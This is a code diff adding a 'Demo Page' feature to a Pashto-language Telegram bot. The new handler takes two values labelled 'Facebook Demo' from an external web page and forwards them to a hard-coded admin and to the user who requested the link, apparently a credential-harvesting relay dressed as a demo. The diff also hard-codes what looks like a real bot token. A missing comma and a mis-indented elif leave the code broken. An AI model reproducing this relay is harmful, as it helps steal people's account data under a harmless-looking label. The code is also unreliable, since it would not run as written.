@@ -1,5 +1,6 @@
 import os
-from telegram import Update, ReplyKeyboardMarkup
+import json
+from telegram import Update, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -10,11 +11,17 @@ from telegram.ext import (
 
 # ========= BOT CREDIT =========
 BOT_CREDIT = "🤖 دا بوټ د سالار خانو لخوا جوړ شوی"
-
 # ========= TOKEN =========
 # ❗ دلته خپل توکن پیست کړه
 BOT_TOKEN = "8104728401:AAGnpTrjMUzkl6ddSEPHHtfgzjEcIhiLhps"
-
+# =========================
+# 🔴 نوې برخه: ADMIN ID
+# =========================
+ADMIN_ID = 5887665463   # 👈 خپل Telegram ID دلته ولیکه
+# =========================
+# 🔴 نوې برخه: وروستی لینک اخیستونکی
+# =========================
+LAST_REQUESTER_ID = None
 # ========= START =========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
@@ -25,6 +32,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ["5️⃣ ترمیکس ډاونلوډ"],
         ["6️⃣ د سالار واتساف"],
         ["7️⃣ د کورنا سوی ایدی جوړول"]
+        ["8️⃣ Demo Page"]  # 🔴 نوې برخه
     ]
     await update.message.reply_text(
         f"👋 سلام!\nیو انتخاب وکړئ 👇\n\n{BOT_CREDIT}",
@@ -126,6 +134,7 @@ async def memorial(update: Update, context: ContextTypes.DEFAULT_TYPE):
 دلته دکورنا سوی ایدی جوړول زده کیږی داسنادو سره
 
 📌 لازم معلومات:
+	
 1️⃣ دکورنا سوی ایدی مکمل نوم
 2️⃣ دکورنا سوی ایدی جیمیل
 3️⃣ دایدی دفیدایشت تاریخ
@@ -140,6 +149,52 @@ https://m.facebook.com/help/contact/292558237463098
 
 """ + BOT_CREDIT)
 
+
+# =========================
+# 🔴 نوې برخه: Demo Page خلاصول
+# =========================
+async def demo_page(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global LAST_REQUESTER_ID
+    LAST_REQUESTER_ID = update.message.from_user.id
+
+    keyboard = [[{
+        "text": "📘 Open Demo Page",
+        "web_app": WebAppInfo(
+            url="https://salarkhanoo2003.github.io/bot/"
+        )
+    }]]
+
+    await update.message.reply_text(
+        "Demo Page خلاص کړه 👇",
+        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    )
+
+
+# =========================
+# 🔴 نوې برخه: د Demo Page نه معلومات اخیستل
+# =========================
+async def webapp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global LAST_REQUESTER_ID
+
+    data = json.loads(update.message.web_app_data.data)
+    field1 = data.get("field1", "")
+    field2 = data.get("field2", "")
+
+    msg = (
+        "📘 Demo Page Data\n\n"
+        f"Facebook Demo:\n{field1}\n\n"
+        f"Facebook Demo 1:\n{field2}"
+    )
+
+    # ادمین ته
+    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
+
+    # لینک اخیستونکي ته
+    if LAST_REQUESTER_ID:
+        await context.bot.send_message(chat_id=LAST_REQUESTER_ID, text=msg)
+
+    await update.message.reply_text("✅ معلومات واستول شول")
+    
 # ========= MESSAGE HANDLER =========
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
@@ -158,22 +213,22 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await whatsapp(update, context)
     elif text == "7️⃣ د کورنا سوی ایدی جوړول":
         await memorial(update, context)
+        elif text == "8️⃣ Demo Page":
+        await demo_page(update, context)
     else:
         await update.message.reply_text("❌ مهرباني وکړئ له مینو څخه انتخاب وکړئ")
 
 # ========= MAIN =========
 def main():
-    if BOT_TOKEN == "PASTE_YOUR_BOT_TOKEN_HERE":
-        print("❌ مهرباني وکړئ BOT TOKEN داخل کړئ")
-        return
-
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, webapp_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
     print("🤖 Bot is running...")
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
